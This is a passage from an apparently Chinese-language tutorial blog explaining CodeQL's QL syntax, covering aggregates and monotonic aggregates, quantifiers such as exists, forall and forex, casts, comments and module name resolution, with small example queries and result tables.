3, 3, 4, 4, 4, 4, 4, 4</code></p>\n<p><strong>4. 应用 aggregates function：</strong></p>\n<p><code>0 + 0 + 0 + 0 + 0 + 0 + 1 + 1 + 1 + 1 + 1 + 1 + 2 + 2 + 2 + 2 + 2 + 2 + 3 + 3 + 3 + 3 + 3 + 3 + 4 + 4 + 4 + 4 + 4 + 4</code></p>\n<p>值为60。</p>\n<p>如果为这种</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select <span class=\"title function_\">sum</span><span class=\"params\">(<span class=\"type\">int</span> i, <span class=\"type\">int</span> j |</span></span><br><span class=\"line\"><span class=\"params\">    exists(string s | s = <span class=\"string\">&quot;hello&quot;</span>.charAt(i)</span>) and </span><br><span class=\"line\">    <span class=\"title function_\">exists</span><span class=\"params\">(string s | s = <span class=\"string\">&quot;world!&quot;</span>.charAt(j)</span>) </span><br><span class=\"line\">    | i+j)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0 + 0 = 0</span><br><span class=\"line\">0 + 1 = 1</span><br><span class=\"line\">0 + 2 = 2</span><br><span class=\"line\">...</span><br><span class=\"line\">4 + 5 = 9</span><br></pre></td></tr></table></figure>\n\n<p>值为135</p>\n<p>按照那4步来就行。</p>\n<h3 id=\"Omitting-parts-of-an-aggregation\"><a href=\"#Omitting-parts-of-an-aggregation\" class=\"headerlink\" title=\"Omitting parts of an aggregation\"></a>Omitting parts of an aggregation</h3><p>其实有些地方可以适当简写。</p>\n<ol>\n<li><strong>省略 <variable declarations> 和 <formula></strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;aggregate&gt;(&lt;type&gt; v | &lt;expression&gt; = v | v)</span><br><span class=\"line\">简写成</span><br><span class=\"line\">&lt;aggregate&gt;(&lt;expression&gt;)</span><br></pre></td></tr></table></figure>\n\n<p>例如</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">count(<span class=\"type\">int</span> i | i = <span class=\"string\">&quot;hello&quot;</span>.indexOf(<span class=\"string\">&quot;l&quot;</span>) | i)</span><br><span class=\"line\">count(<span class=\"string\">&quot;hello&quot;</span>.indexOf(<span class=\"string\">&quot;l&quot;</span>))</span><br></pre></td></tr></table></figure>\n\n<p>• “hello”.indexOf(“l”) 直接返回所有 “l” 的索引位置（2, 3）。</p>\n<p>• count 统计这些索引的个数，因此两种写法等价。</p>\n<ol start=\"2\">\n<li><strong>省略 <expression></strong></li>\n</ol>\n<p>如果只有一个aggregation variable，则可以省略 aggregation variable，此时表达式默认为该变量本身。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">avg(int i | i = [0 .. 3] | i)</span><br><span class=\"line\">avg(int i | i = [0 .. 3])</span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li>在 count 中，即使有多个aggregation variable，也可以省略 <expression>，此时表达式默认为常量 1，即统计满足条件的所有元组数量。</li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">count(<span class=\"type\">int</span> i, <span class=\"type\">int</span> j | i in [<span class=\"number\">1</span> .. <span class=\"number\">3</span>] and j in [<span class=\"number\">1</span> .. <span class=\"number\">3</span>] | <span class=\"number\">1</span>)</span><br><span class=\"line\">count(<span class=\"type\">int</span> i, <span class=\"type\">int</span> j | i in [<span class=\"number\">1</span> .. <span class=\"number\">3</span>] and j in [<span class=\"number\">1</span> .. <span class=\"number\">3</span>])</span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>省略 <formula>，仅保留两个竖线 ||</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;aggregate&gt;(&lt;variable declarations&gt; | | &lt;expression&gt;)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">max(File f | | f.getTotalNumberOfLines())</span><br></pre></td></tr></table></figure>\n\n<p>这段代码的意思是：统计数据库中所有文件的最大行数。</p>\n<ol start=\"5\">\n<li><strong>省略 <formula> 和 <expression></strong></li>\n</ol>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">count(File f | any() | <span class=\"number\">1</span>)</span><br><span class=\"line\">count(File f | | <span class=\"number\">1</span>)</span><br><span class=\"line\">count(File f)</span><br></pre></td></tr></table></figure>\n\n<p>count(File f) 直接统计数据库中的文件数量。</p>\n<h3 id=\"Monotonic-单调-aggregates\"><a href=\"#Monotonic-单调-aggregates\" class=\"headerlink\" title=\"Monotonic(单调) aggregates\"></a>Monotonic(单调) aggregates</h3><p>直接看官方给的例子吧。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string <span class=\"title function_\">getPerson</span><span class=\"params\">()</span> &#123; result = <span class=\"string\">&quot;Alice&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                     <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Bob&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                     <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Charles&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                     <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Diane&quot;</span></span><br><span class=\"line\">                   &#125;</span><br><span class=\"line\">string <span class=\"title function_\">getFruit</span><span class=\"params\">(string p)</span> &#123; p = <span class=\"string\">&quot;Alice&quot;</span>   <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Orange&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                            <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Alice&quot;</span>   <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Apple&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                            <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Bob&quot;</span>     <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Apple&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                            <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Charles&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Apple&quot;</span> <span class=\"type\">or</span></span><br><span class=\"line\">                            <span class=\"variable\">p</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Charles&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Banana&quot;</span></span><br><span class=\"line\">                          &#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getPrice</span><span class=\"params\">(string f)</span> &#123; f = <span class=\"string\">&quot;Apple&quot;</span>  <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"number\">100</span> <span class=\"type\">or</span></span><br><span class=\"line\">                         <span class=\"variable\">f</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Orange&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span> <span class=\"number\">100</span> <span class=\"type\">or</span></span><br><span class=\"line\">                         <span class=\"variable\">f</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;Orange&quot;</span> <span class=\"type\">and</span> <span class=\"variable\">result</span> <span class=\"operator\">=</span>   <span class=\"number\">1</span></span><br><span class=\"line\">                       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">predicate <span class=\"title function_\">nonmono</span><span class=\"params\">(string p, <span class=\"type\">int</span> cost)</span> &#123;</span><br><span class=\"line\">  p = getPerson() <span class=\"type\">and</span> <span class=\"variable\">cost</span> <span class=\"operator\">=</span> sum(string f | f = getFruit(p) | getPrice(f))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">language[monotonicAggregates]</span><br><span class=\"line\">predicate <span class=\"title function_\">mono</span><span class=\"params\">(string p, <span class=\"type\">int</span> cost)</span> &#123;</span><br><span class=\"line\">  p = getPerson() <span class=\"type\">and</span> <span class=\"variable\">cost</span> <span class=\"operator\">=</span> sum(string f | f = getFruit(p) | getPrice(f))</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">from string variant, string person, <span class=\"type\">int</span> cost</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">variant</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;default&quot;</span>  and <span class=\"title function_\">nonmono</span><span class=\"params\">(person, cost)</span> <span class=\"type\">or</span></span><br><span class=\"line\">      <span class=\"variable\">variant</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;monotonic&quot;</span> and <span class=\"title function_\">mono</span><span class=\"params\">(person, cost)</span></span><br><span class=\"line\">select variant, person, cost</span><br><span class=\"line\">order by variant, person</span><br></pre></td></tr></table></figure>\n\n<table>\n<thead>\n<tr>\n<th align=\"left\">variant</th>\n<th align=\"left\">person</th>\n<th align=\"left\">cost</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\">default</td>\n<td align=\"left\">Alice</td>\n<td align=\"left\">201</td>\n</tr>\n<tr>\n<td align=\"left\">default</td>\n<td align=\"left\">Bob</td>\n<td align=\"left\">100</td>\n</tr>\n<tr>\n<td align=\"left\">default</td>\n<td align=\"left\">Charles</td>\n<td align=\"left\">100</td>\n</tr>\n<tr>\n<td align=\"left\">default</td>\n<td align=\"left\">Diane</td>\n<td align=\"left\">0</td>\n</tr>\n<tr>\n<td align=\"left\">monotonic</td>\n<td align=\"left\">Alice</td>\n<td align=\"left\">101</td>\n</tr>\n<tr>\n<td align=\"left\">monotonic</td>\n<td align=\"left\">Alice</td>\n<td align=\"left\">200</td>\n</tr>\n<tr>\n<td align=\"left\">monotonic</td>\n<td align=\"left\">Bob</td>\n<td align=\"left\">100</td>\n</tr>\n<tr>\n<td align=\"left\">monotonic</td>\n<td align=\"left\">Diane</td>\n<td align=\"left\">0</td>\n</tr>\n</tbody></table>\n<p><strong>标准聚合</strong> 和 <strong>单调聚合</strong> 在处理公式 <formula> 和表达式 <expression> 的值时有如下不同：</p>\n<p><strong>标准聚合：</strong></p>\n<p>•对每个由 <formula> 生成的值，计算对应的 <expression> 值，<strong>将它们展平为一个列表</strong>。</p>\n<p>•然后对这个列表应用聚合函数，例如 sum、count 等。</p>\n<p><strong>单调聚合：</strong></p>\n<p>•对每个由 <formula> 生成的值，计算对应的 <expression> 值，<strong>创建所有可能的组合</strong>。</p>\n<p>•对每种组合分别应用聚合函数。</p>\n<p><strong>结果差异：</strong></p>\n<p>•<strong>标准聚合</strong> 通常返回一个结果，表示所有值的总和、计数等。</p>\n<p>•<strong>单调聚合</strong> 会返回多行结果，表示每种可能组合的聚合值。</p>\n<p><strong>场景 1: 缺少 <expression> 值</strong></p>\n<p>•如果 <formula> 生成的某个值没有对应的 <expression> 值：</p>\n<p>•<strong>标准聚合</strong> 会忽略这个缺失值，计算其他值的结果。</p>\n<p>•<strong>单调聚合</strong> 不会计算结果，因为缺失值使得无法创建完整的组合。</p>\n<p><strong>场景 2: 多个 <expression> 值</strong></p>\n<p>•如果 <formula> 生成的某个值有多个对应的 <expression> 值：</p>\n<p>•<strong>标准聚合</strong> 将所有 <expression> 值展平成一个列表，计算一个结果。</p>\n<p>•<strong>单调聚合</strong> 会生成多种组合，对每种组合分别计算结果。</p>\n<h4 id=\"Recursive-monotonic-aggregates\"><a href=\"#Recursive-monotonic-aggregates\" class=\"headerlink\" title=\"Recursive monotonic aggregates\"></a>Recursive monotonic aggregates</h4><p>暂时不讲解</p>\n<h2 id=\"Any\"><a href=\"#Any\" class=\"headerlink\" title=\"Any\"></a>Any</h2><table>\n<thead>\n<tr>\n<th align=\"left\">Expression</th>\n<th align=\"left\">Values</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"left\"><code>any(File f)</code></td>\n<td align=\"left\">all <code>File</code>s in the database</td>\n</tr>\n<tr>\n<td align=\"left\">&#96;any(Element e</td>\n<td align=\"left\">e.getName())&#96;</td>\n</tr>\n<tr>\n<td align=\"left\">&#96;any(int i</td>\n<td align=\"left\">i &#x3D; [0 .. 3])&#96;</td>\n</tr>\n<tr>\n<td align=\"left\">&#96;any(int i</td>\n<td align=\"left\">i &#x3D; [0 .. 3]</td>\n</tr>\n</tbody></table>\n<h2 id=\"Unary-operations\"><a href=\"#Unary-operations\" class=\"headerlink\" title=\"Unary operations\"></a>Unary operations</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-6.28</span><br><span class=\"line\">+(10 - 4)</span><br><span class=\"line\">+avg(float f | f = 3.4 or f = -9.8)</span><br><span class=\"line\">-sum(int i | i in [0 .. 9] | i * i)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Binary-operations\"><a href=\"#Binary-operations\" class=\"headerlink\" title=\"Binary operations\"></a>Binary operations</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">5 % 2</span><br><span class=\"line\">(9 + 1) / (-2)</span><br><span class=\"line\">&quot;Q&quot; + &quot;L&quot;</span><br><span class=\"line\">2 * min(float f | f in [-3 .. 3])</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Casts-类型转换\"><a href=\"#Casts-类型转换\" class=\"headerlink\" title=\"Casts(类型转换)\"></a>Casts(类型转换)</h2><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java</span><br><span class=\"line\"></span><br><span class=\"line\">from Type t</span><br><span class=\"line\">where t.(Class).getASupertype().hasName(<span class=\"string\">&quot;List&quot;</span>)</span><br><span class=\"line\">select t</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Don’t-care-expressions\"><a href=\"#Don’t-care-expressions\" class=\"headerlink\" title=\"Don’t-care expressions\"></a>Don’t-care expressions</h2><p>其实这个符号在其它语言也经常见</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from string s</span><br><span class=\"line\"><span class=\"type\">where</span> <span class=\"variable\">s</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;hello&quot;</span>.charAt(_)</span><br><span class=\"line\">select s</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Formulas-公式\"><a href=\"#Formulas-公式\" class=\"headerlink\" title=\"Formulas 公式\"></a>Formulas 公式</h1><h2 id=\"Comparisons-比较\"><a href=\"#Comparisons-比较\" class=\"headerlink\" title=\"Comparisons 比较\"></a>Comparisons 比较</h2><p>这里提一下。<br>就是一个等号在这里代表的就是Equal to<br>Not equal to就是 !&#x3D;<br>定义的话用的是from</p>\n<h2 id=\"Type-checks\"><a href=\"#Type-checks\" class=\"headerlink\" title=\"Type checks\"></a>Type checks</h2><p>类型检查，和java里面的instanceof功能差不多</p>\n<p><code>&lt;expression&gt; instanceof &lt;type&gt;</code></p>\n<h2 id=\"Range-checks\"><a href=\"#Range-checks\" class=\"headerlink\" title=\"Range checks\"></a>Range checks</h2><p>检查范围<br>A range check is a formula that looks like:<br><code>&lt;expression&gt; in &lt;range&gt;</code></p>\n<p><code>x in [2.1 .. 10.5]</code> </p>\n<h2 id=\"Calls-to-predicates-1\"><a href=\"#Calls-to-predicates-1\" class=\"headerlink\" title=\"Calls to predicates\"></a>Calls to predicates</h2><p>谓词调用。</p>\n<h2 id=\"Parenthesized-formulas\"><a href=\"#Parenthesized-formulas\" class=\"headerlink\" title=\"Parenthesized formulas\"></a>Parenthesized formulas</h2><p>杯括号包裹起来的 formulas</p>\n<h3 id=\"Explicit-quantifiers显示量词\"><a href=\"#Explicit-quantifiers显示量词\" class=\"headerlink\" title=\"Explicit quantifiers显示量词\"></a>Explicit quantifiers显示量词</h3><h4 id=\"exists\"><a href=\"#exists\" class=\"headerlink\" title=\"exists\"></a><code>exists</code></h4><p>都很好理解。</p>\n<p>This quantifier has the following syntax:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">exists(&lt;variable declarations&gt; | &lt;formula&gt;)</span><br></pre></td></tr></table></figure>\n\n<p>You can also write <code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</code>. This is equivalent to <code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; and &lt;formula 2&gt;)</code>.</p>\n<p>This quantified formula introduces some new variables. It holds if there is at least one set of values that the variables could take to make the formula in the body true.</p>\n<p>For example, <code>exists(int i | i instanceof OneTwoThree)</code> introduces a temporary variable of type <code>int</code> and holds if any value of that variable has type <code>OneTwoThree</code>.</p>\n<h4 id=\"forall\"><a href=\"#forall\" class=\"headerlink\" title=\"forall\"></a><code>forall</code></h4><p>This quantifier has the following syntax:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">forall(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure>\n\n<p><code>forall</code> introduces some new variables, and typically has two formulas in its body. It holds if <code>&lt;formula 2&gt;</code> holds for all values that <code>&lt;formula 1&gt;</code> holds for.</p>\n<p>For example, <code>forall(int i | i instanceof OneTwoThree | i &lt; 5)</code> holds if all integers that are in the class <code>OneTwoThree</code> are also less than <code>5</code>. In other words, if there is a value in <code>OneTwoThree</code> that is greater than or equal to <code>5</code>, then the formula doesn’t hold.</p>\n<p>Note that <code>forall(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</code> is logically the same as <code>not exists(&lt;vars&gt; | &lt;formula 1&gt; | not &lt;formula 2&gt;)</code>.</p>\n<h4 id=\"forex\"><a href=\"#forex\" class=\"headerlink\" title=\"forex\"></a><code>forex</code></h4><p>This quantifier has the following syntax:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">forex(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure>\n\n<p>This quantifier exists as a shorthand for:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">forall(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;) and</span><br><span class=\"line\">exists(&lt;vars&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>In other words, <code>forex</code> works in a similar way to <code>forall</code>, except that it ensures that there is at least one value for which <code>&lt;formula 1&gt;</code> holds. To see why this is useful, note that the <code>forall</code> quantifier could hold trivially. For example, <code>forall(int i | i = 1 and i = 2 | i = 3)</code> holds: there are no integers <code>i</code> which are equal to both <code>1</code> and <code>2</code>, so the second part of the body <code>(i = 3)</code> holds for every integer for which the first part holds.</p>\n<p>Since this is often not the behavior that you want in a query, the <code>forex</code> quantifier is a useful shorthand.</p>\n</blockquote>\n<h3 id=\"Implicit-quantifiers\"><a href=\"#Implicit-quantifiers\" class=\"headerlink\" title=\"Implicit quantifiers\"></a>Implicit quantifiers</h3><p>相当于我们上面提到的 Don’t-care expressions。</p>\n<h2 id=\"Logical-connectives\"><a href=\"#Logical-connectives\" class=\"headerlink\" title=\"Logical connectives\"></a>Logical connectives</h2><ol>\n<li>Negation (not)</li>\n<li>Conditional formula (if…..then…else)</li>\n<li>Conjunction (and)</li>\n<li>Disjunction (or)</li>\n<li>Implication (implies)</li>\n</ol>\n<h3 id=\"any\"><a href=\"#any\" class=\"headerlink\" title=\"any()\"></a><code>any()</code></h3><h3 id=\"none\"><a href=\"#none\" class=\"headerlink\" title=\"none()\"></a><code>none()</code></h3><h3 id=\"not\"><a href=\"#not\" class=\"headerlink\" title=\"not\"></a><code>not</code></h3><p>……</p>\n<h1 id=\"Annotations\"><a href=\"#Annotations\" class=\"headerlink\" title=\"Annotations\"></a>Annotations</h1><p>有点像java里面的修饰符。</p>\n<p>像 <code>abstract</code> <code>deprecated</code> <code>final</code>这些前面都提到过。</p>\n<h1 id=\"Lexical-syntax\"><a href=\"#Lexical-syntax\" class=\"headerlink\" title=\"Lexical syntax\"></a>Lexical syntax</h1><h2 id=\"Comments\"><a href=\"#Comments\" class=\"headerlink\" title=\"Comments\"></a>Comments</h2><p>有两种注释方法。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * A QLDoc comment that describes the class `Digit`.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Digit</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">int</span> &#123;  <span class=\"comment\">// A short one-line comment</span></span><br><span class=\"line\">  Digit() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span> in [<span class=\"number\">0</span> .. <span class=\"number\">9</span>]</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">  A standard multiline comment, perhaps to provide</span></span><br><span class=\"line\"><span class=\"comment\">  additional details, or to write a TODO comment.</span></span><br><span class=\"line\"><span class=\"comment\">*/</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Name-resolution-解析\"><a href=\"#Name-resolution-解析\" class=\"headerlink\" title=\"Name resolution(解析)\"></a>Name resolution(解析)</h1><h2 id=\"Names\"><a href=\"#Names\" class=\"headerlink\" title=\"Names\"></a>Names</h2><p>处理一个name首先在当前模块的命名空间中查找名称。</p>\n<p>如果是import语句。name resolution会更加复杂，看下面这个例子。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javascript</span><br></pre></td></tr></table></figure>\n\n<p>编译器首先检查库模块javascript.qll，再采取下面说到的那些步骤。如果失败，它会检查在Example.ql的模块命名空间中定义的名为javascript的explicit module。</p>\n<h2 id=\"Qualified-references\"><a href=\"#Qualified-references\" class=\"headerlink\" title=\"Qualified references\"></a>Qualified references</h2><p>限定引用是一种模块表达式，使用 . 作为文件路径分隔符。它只能在 import 语句中使用，用于导入由相对路径定义的库模块。比如我们Example.ql有如下一个import语句。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> examples.security.MyLibrary</span><br></pre></td></tr></table></figure>\n\n<p><strong>1. 当前目录查找</strong> 编译器首先从包含当前 Example.ql 文件的目录中查找目标文件 examples&#x2F;security&#x2F;MyLibrary.ql</p>\n<p><strong>2. 查询目录查找</strong> 查找相对路径 examples&#x2F;security&#x2F;MyLibrary.qll。如果查询目录未配置或路径中未找到目标文件，继续下一步。查询目录是第一个包含qlpack.yml文件的目录。（或者，在老版本中，是一个名为queries.xml的文件。）</p>\n<p>**3. 库路径查找 ** 查看qlpack.yml 文件中的 libraryPathDependencies 设置</p>\n<p><strong>4. 查找失败</strong> 如果还找不到编译会报错。</p>\n<h2 id=\"Selections\"><a href=\"#Selections\" class=\"headerlink\" title=\"Selections\"></a>Selections</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;module_expression&gt;::&lt;name&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Example\"><a href=\"#Example\" class=\"headerlink\" title=\"Example\"></a>Example</h3><p><strong>CountriesLib.qll</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Countries</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">string</span> &#123;</span><br><span class=\"line\">  Countries() &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span> = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">    <span class=\"type\">or</span></span><br><span class=\"line\">    <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;India&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">module</span> M &#123;</span><br><span class=\"line\">  <span class=\"keyword\">class</span> <span class=\"title class_\">EuropeanCountries</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">Countries</span> &#123;</span><br><span class=\"line\">    EuropeanCountries() &#123;</span><br><span class=\"line\">      <span class=\"built_in\">this</span> = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">      <span class=\"type\">or</span></span><br><span class=\"line\">      <span class=\"variable\">this</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;France&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;<span class=\"keyword\">class</span> <span class=\"title class_\">Countries</span> <span class=\"keyword\">extends</span> <span class=\"title 